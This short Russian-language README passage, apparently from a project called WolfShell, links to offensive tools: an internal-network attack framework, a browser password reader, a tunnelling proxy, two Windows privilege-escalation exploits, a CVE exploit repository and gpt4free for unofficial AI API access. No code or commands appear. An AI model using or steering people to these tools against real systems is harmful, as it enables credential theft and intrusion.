* **Ladon** (фреймворк для внутренней сети): https://github.com/k8gege/Ladon
* **gpt4free** (API для ИИ): https://github.com/xtekky/gpt4free
* **SharpWeb** (чтение паролей браузера): https://github.com/djhohnstein/SharpWeb
* **suo5** (HTTP прокси): https://github.com/zema1/suo5
* **BadPotato** (повышение привилегий): https://github.com/BeichenDream/BadPotato
* **EfsPotato** (повышение привилегий): https://github.com/zcgonvh/EfsPotato
* **CVE-2025-59287** (.NET десериализация): https://github.com/0x7556/CVE-2025-59287

## Подписывайтесь

* Мы рады вашему вниманию на нашем Github и в соцсетях!
  
![WolfShell](join.png) ![WolfShell](join_group.jpg)
